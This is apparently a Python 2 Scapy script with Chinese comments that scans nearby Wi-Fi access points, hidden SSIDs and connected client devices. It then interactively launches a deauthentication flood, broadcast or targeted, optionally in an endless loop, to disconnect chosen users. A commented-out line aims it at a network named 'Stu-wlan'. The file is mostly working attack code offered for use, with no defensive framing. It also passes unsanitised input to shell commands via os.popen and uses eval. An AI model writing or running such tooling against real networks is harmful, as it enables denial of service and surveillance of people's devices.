#!/usr/bin/python2
#-*-coding:utf-8-*-

'''
这个程序需要在root权限下运行
'''

import os,sys,threading,argparse,copy

import binascii  #隐藏热点的SSID值为b'\x00\x00\x00\x00\x00\x00\x00'，需要使用这个库进行转换

from scapy.all import *

#mac2company函数返回unicode字符串
from Mac2Company import mac2company

#用来重定向输出的类
class Redirect:
    def __init__(self):
        self.content = ''
        self.savedStdout = sys.stdout
        self.hidden = None
    
    def write(self,outStr):
        #self.content += outStr
        pass
    
    def recover(self):
        sys.stdout = self.savedStdout
    def redirect(self):
        self.hidden = open(os.devnull,'w')
        sys.stdout = self.hidden


'''
函数返回传入的参数:iface,addr,count_5,count_8,count_sendp,count_user
默认监听端口:iface
发送Probe Request的机器的物理地址:addr
探测到Probe Response帧的数量:count_5
探测到信标帧的数量:count_8
发送的Probe Request帧的数量:count_send
用来获得客户端mac地址的帧的数量:count_user
'''
def handleArgv():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--iface',type=str,default='mon0')
    parser.add_argument('-a','--addr',type=str,default='40:e2:30:d2:c4:0f')
    parser.add_argument('-5','--count_5',type=int,default=100)
    parser.add_argument('-8','--count_8',type=int,default=100)
    parser.add_argument('--count_sendp',type=int,default=1000)
    parser.add_argument('--count_user',type=int,default=100)
    argv = parser.parse_args()
    iface = argv.iface
    addr = argv.addr
    count_5 = argv.count_5
    count_8 = argv.count_8
    count_sendp = argv.count_sendp
    count_user = argv.count_user
    #print(argv)
    return iface,addr,count_5,count_8,count_sendp,count_user



def isExistIface(iface):
    info = os.popen("iw dev | grep -E '"+iface+"$'").read()
    if info != '':
        return True
    else:
        return False

def isMonitorMode(iface):
    info = os.popen("iwconfig "+iface+" | grep '"+iface+"' | awk '{print $4}'").read()
    if 'Monitor' in info or 'monitor' in info:
        return True
    else:
        return False

#函数返回热点和隐藏热点
def searchSSID(iface,type,subtypes,count):
    ssids = {}
    hide_ssids = set()
    if count == 0:
        return ssids,hide_ssids
    print('******start sniff ap******')
    pkts = sniff(iface=iface,count=count,lfilter=lambda x : x.type==type and x.subtype in subtypes)
    wrpcap('../res/data_from_py_type:{0}_subtype:{1}.pcap'.format(type,subtypes),pkts)
    print('******over sniff ap******')
    for pkt in pkts:
        if pkt.info == '':
            pass
        elif binascii.hexlify(pkt.info)[:2] != '00':
            ssids[pkt.info] = pkt.addr2
        else:
            hide_ssids.add(pkt.addr2)
    return ssids,hide_ssids


'''
函数返回客户端的mac地址
返回值为一个字典,格式类似于{'device_name':['device_mac',{'ap_connected':'ap_mac'}]}
一些信息:
    数据帧的FCfield变量取值范围:
        from-DS+wep:66
        to-DS+wep:65
        from-DS+retry+wep:74
        to-DS+retry+wep:73
        from-DS:2
        to-DS:1
        to-DS+pw-mgt:17
        from-DS+pw-mgt:18
        to-DS+retry+pw-mgt:25
        from-DS+retry+pw-mgt:26
'''
def searchUser(iface,type,subtypes,count):
    user_temp = {}
    user = {}
    if count == 0:
        return user
    print('******start sniff user******')
    pkts = sniff(iface=iface,count=count,lfilter=lambda x : x.type==type and x.subtype in subtypes)
    wrpcap('../res/data_from_py_type:{0}_subtype:{1}.pcap'.format(type,subtypes),pkts)
    print('******sniff user over******')
    for pkt in pkts:
        if pkt.FCfield in [1,17,25,65,73]:
            user_temp[pkt.addr2] = [pkt.addr2,{'ap_connected':pkt.addr1}]
        elif pkt.FCfield in [2,18,26,66,74]:
            user_temp[pkt.addr1] = [pkt.addr1,{'ap_connected':pkt.addr2}]
    for user_name,user_mac in user_temp.items():
        user[mac2company(user_name).encode('utf-8')+'_'+'_'.join(user_name.split(':')[3:])] = user_mac
    return user

class ManagementFrame:
    def __init__(self,Rates='\x02\x04\x0b\x16',ESRates='\x0c\x12\x18\x24\x30\x48\x60\x6c'):
        self.Rates = Rates
        self.ESRates = ESRates

    def ProbeReq(self,addr2,addr1='ff:ff:ff:ff:ff:ff',addr3='ff:ff:ff:ff:ff:ff',SSID=''):
        pkt = RadioTap(len=13,present='Rate+b15+b17',notdecoded='\x02\x00\x00\x00\x00')
        pkt /= Dot11(addr1=addr1,addr2=addr2,addr3=addr3)
        pkt /= Dot11ProbeReq()/Dot11Elt(ID='SSID',info=SSID)
        pkt /= Dot11Elt(ID='Rates',info=self.Rates)
        pkt /= Dot11Elt(ID='ESRates',info=self.ESRates)
        #pkt /= Dot11Elt(ID='DSset',info='\x01')
        #pkt /= Dot11Elt(ID=45,info='\x2C\x01\x03\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        #pkt /= Dot11Elt(ID='vendor',info='\x00\x50\xf2\x08\x00\x00\x00')
        return pkt

    def Deauth(self,addr1,addr2,addr3):
        '''
        当addr1赋值为ff:ff:ff:ff:ff:ff时，返回的解除认证帧为广播发送
        当不发送广播包时，返回两个解除认证帧，一个为ap2sta，另一个为sta2ap
        '''
        pkt = RadioTap(len=12,present='Rate+b15',notdecoded='\x02\x00\x18\x00')
        pkt /= Dot11(ID=14849,addr3=addr3,addr4=None)
        pkt /= Dot11Deauth(reason='class3-from-nonass')
        '''
        当用sendp发送上面的包时，会自动发送一个len=13,present='Rate+b15+b17'的包
        '''

        if addr1.lower() == 'ff:ff:ff:ff:ff:ff':
            pkt_broadcast = copy.deepcopy(pkt)
            pkt_broadcast.addr1 = addr1
            pkt_broadcast.addr2 = addr2
            return pkt_broadcast
        else:
            ap2sta = copy.deepcopy(pkt)
            sta2ap = copy.deepcopy(pkt)
            if addr2 == addr3:
                ap2sta.addr1 = addr1
                ap2sta.addr2 = addr2
                sta2ap.addr1 = addr2
                sta2ap.addr2 = addr1
            elif addr1 == addr3:
                ap2sta.addr1 = addr2
                ap2sta.addr2 = addr1
                sta2ap.addr1 = addr1
                sta2ap.addr2 = addr2
            return ap2sta , sta2ap
    

def startSendpDeauth(iface,broadcast=False,times=1,*pkts):
    '''
    当以startSendpDeauth('mon0',False,5,pkts),其中pkts=(pkt1,pkt2)这种形式调用函数时,
    参数pkts=(pkts)=((pkt1,pkt2)),因此需要下面的判断
    '''
    if not broadcast and len(pkts) == 1:
        pkts = pkts[0]
    '''
    以len=12和len=13的Deauthentication包为一轮，每一轮都发送这两个包，并且每一轮的SC参数都增长32,从0开始
    '''
    r = Redirect()
    r.redirect()
    if broadcast:
        if times == 0:
            while True:
                j = -1
                for i in range(128):
                    if i%2 == 0:
                        j = j+1
                    pkt = copy.deepcopy(pkts[0])
                    pkt.SC = pkt.SC + j*32
                    #print(j,':',pkt.SC)
                    sendp(pkt,iface=iface)
        else:
            for time in range(times):
                j = -1
                for i in range(128):
                    if i%2 == 0:
                        j = j+1
                    pkt = copy.deepcopy(pkts[0])
                    pkt.SC = pkt.SC + j*32
                    #print(j,':',pkt.SC)
                    sendp(pkt,iface=iface)
    else:
        if times == 0:
            while True:
                j = -1
                for i in range(128):
                    if i%2 == 0:
                        j = j+1
                    pkt = copy.deepcopy(pkts[i%2])
                    pkt.SC = pkt.SC + j*32
                    #print(j,':',pkt.SC)
                    sendp(pkt,iface=iface)
        else:
            for time in range(times):
                j = -1
                for i in range(128):
                    if i%2 == 0:
                        j = j+1
                    pkt = copy.deepcopy(pkts[i%2])
                    pkt.SC = pkt.SC + j*32
                    #print(j,':',pkt.SC)
                    sendp(pkt,iface=iface)
    r.recover()
    print('')#换行，使打印更好看
    return
      


def attack(func_name,*func_args):
    eval(func_name)(*func_args)

def test(a,b,c,*d):
    print(d)



def main():
    iface,addr,count_5,count_8,count_sendp,count_user = handleArgv()
    if isExistIface(iface):
        print("接口"+iface+"存在")
    else:
        print("接口"+iface+"不存在")
        return
    print('')
    if isMonitorMode(iface):
        print("接口"+iface+"已开启monitor模式")
    else:
        print("接口"+iface+"未开启monitor模式,请先开启monitor模式")
        return
    print('')

    mg = ManagementFrame()
    pkt_4 = mg.ProbeReq(addr)
    print('想要接收到'+str(count_8)+"个信标帧")
    if count_8:
        sendp(pkt_4,iface=iface,count=count_sendp)
    ssids,hide_ssids = searchSSID(iface,0,[8],count_8)
    print('已经接收到'+str(count_8)+"个信标帧")
    print('')
    print('想要接收到'+str(count_5)+"个探测响应帧")
    if count_5:
        sendp(pkt_4,iface=iface,count=count_sendp)
    ssids_temp,hide_ssids_temp = searchSSID(iface,0,[5],count_5)
    print('已经接收到'+str(count_5)+"个探测响应帧")
    ssids.update(ssids_temp)
    hide_ssids.update(hide_ssids_temp)

    print('')
    print('*******************************')
    print("热点:")
    for ssid,ssid_mac in ssids.items():
        print('热点ssid:'+ssid+'  热点mac地址:'+ssid_mac)
        '''
        如果不进行encode,那么当str+unicode时,str会使用sys.defaultencoding解码为unicode,
        因为默认的sys.defaultencoding不是utf-8,此时会出错
        '''
        print('设备类型:'+mac2company(ssid_mac).encode('utf-8'))
        #print(type(mac2company(ssid_mac))) #<type 'unicode'>
        print('')
    
    print('*******************************')
    print("隐藏热点:")
    if len(hide_ssids):
        for ssid_mac in hide_ssids:
            print('隐藏热点地址:'+ssid_mac)
    else:
        print('未探测到隐藏热点')
    

    #pkt_c_broadcast = mg.Deauth('ff:ff:ff:ff:ff:ff',ssids['Stu-wlan'],ssids['Stu-wlan'])
    #startSendpDeauth(iface,True,5,pkt_c_broadcast)

    print('')
    print('想要接收到'+str(count_user)+'个数据帧')
    user = searchUser(iface,2,[4,8],count_user)
    print('已经接收到'+str(count_user)+'个数据帧')
    print('')
    print('*******************************')
    print('连接设备:')
    if len(user):
        for user_name,user_mac in user.items():
            print('用户设备:'+user_name+'  mac地址:'+user_mac[0]+'  可能连接的路由器的mac地址:'+user_mac[1]['ap_connected'])
            print('')
    else:
        print('未发现用户设备')
    
    #开始选择攻击目标
    while True:
        mg = ManagementFrame()
        go = raw_input('do you want to attack?(y/n):')
        if go.lower() == 'y':
            ap_mac = raw_input('please choose the ap(input ap mac):')
            sta_mac = raw_input('please choose the sta(input sta mac, ff:ff:ff:ff:ff:ff represents broadcast):')
            times = int(raw_input('please input the times you want to attack(0 represents loop):'))
            pkts = mg.Deauth(sta_mac,ap_mac,ap_mac)
            if sta_mac.lower() == 'ff:ff:ff:ff:ff:ff':
                attack('startSendpDeauth',iface,True,times,pkts)
            else:
                attack('startSendpDeauth',iface,False,times,pkts)
        elif go.lower() == 'n':
            return
    






if __name__ == '__main__':
    main()